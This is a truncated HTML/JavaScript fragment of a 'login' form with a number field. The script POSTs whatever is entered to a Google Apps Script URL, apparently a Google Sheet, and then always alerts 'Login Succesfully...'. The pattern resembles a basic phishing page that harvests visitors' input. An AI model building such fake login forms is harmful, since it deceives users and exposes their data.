    <div class="login">

                <input type="number" name="Number" placeholder="Enter your Number"><br>

    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwvnSrDhqKwRUuhILxrce98452RT_rEaq-IP7zS0D29aMzG5sI6If6ug_gKPKPh_ghn/exec'
        const form = document.forms['submit-googlesheet']

        form.addEventListener('submit', e => {
            e.preventDefault()
            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
                .then(response => alert("Login Succesfully..."))
                .catch(error => console.error('Error!', error.message))
